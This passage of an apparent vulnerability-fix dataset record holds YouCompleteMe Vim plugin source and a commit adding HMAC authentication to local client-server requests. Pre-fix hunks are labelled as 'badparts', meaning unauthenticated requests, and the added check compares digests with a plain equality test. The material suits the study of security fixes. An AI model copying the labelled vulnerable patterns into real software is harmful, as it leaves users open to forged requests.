USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https://github.com/Valloric/YouCompleteMe/issues/641\n#  https://github.com/kennethreitz/requests/issues/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http://localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}}, "msg": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}}, "https://github.com/viperauter/ubuntu-fix": {"e965e0284789e610c0a50d20a92a82ec5c135064": {"url": "https://api.github.com/repos/viperauter/ubuntu-fix/commits/e965e0284789e610c0a50d20a92a82ec5c135064", "html_url": "https://github.com/viperauter/ubuntu-fix/commit/e965e0284789e610c0a50d20a92a82ec5c135064", "message": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.", "sha": "e965e0284789e610c0a50d20a92a82ec5c135064", "keyword": "remote code execution prevent", "diff": "diff --git a/python/ycm/client/base_request.py b/python/ycm/client/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a/python/ycm/client/base_request.py\n+++ b/python/ycm/client/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http://localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a/python/ycm/server/hmac_plugin.py b/python/ycm/server/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- /dev/null\n+++ b/python/ycm/server/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!/usr/bin/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http://bottlepy.org/docs/dev/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a/python/ycm/server/ycmd.py b/python/ycm/server/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a/python/ycm/server/ycmd.py\n+++ b/python/ycm/server/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a/python/ycm/utils.py b/python/ycm/utils.py\nindex d9128716..095337c9 100644\n--- a/python/ycm/utils.py\n+++ b/python/ycm/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a/python/ycm/youcompleteme.py b/python/ycm/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a/python/ycm/youcompleteme.py\n+++ b/python/ycm/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http://localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "files": {"/python/ycm/client/base_request.py": {"changes": [{"diff": "\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n", "add": 14, "remove": 10, "filename": "/python/ycm/client/base_request.py", "badparts": ["        return BaseRequest.session.post( _BuildUri( handler ),", "                                        data = ToUtf8Json( data ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "        return BaseRequest.session.get( _BuildUri( handler ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "                              data = ToUtf8Json( data ),", "                              headers = _HEADERS )", "                             headers = _HEADERS )"], "goodparts": ["        sent_data = ToUtf8Json( data )", "        return BaseRequest.session.post(", "            _BuildUri( handler ),", "            data = sent_data,", "            headers = BaseRequest._ExtraHeaders( sent_data ),", "            timeout = timeout )", "        return BaseRequest.session.get(", "            _BuildUri( handler ),", "            headers = BaseRequest._ExtraHeaders(),", "            timeout = timeout )", "        sent_data = ToUtf8Json( data )", "                              data = sent_data,", "                              headers = BaseRequest._ExtraHeaders( sent_data ) )", "                             headers = BaseRequest._ExtraHeaders() )"]}, {"diff": "\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ", "add": 3, "remove": 1, "filename": "/python/ycm/client/base_request.py", "badparts": ["    response = requests.get( _BuildUri( 'healthy' ) )"], "goodparts": ["    response = requests.get( _BuildUri( 'healthy' ),", "                             headers = BaseRequest._ExtraHeaders() )", "    _ValidateResponseObject( response )"]}], "source": "\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http://localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    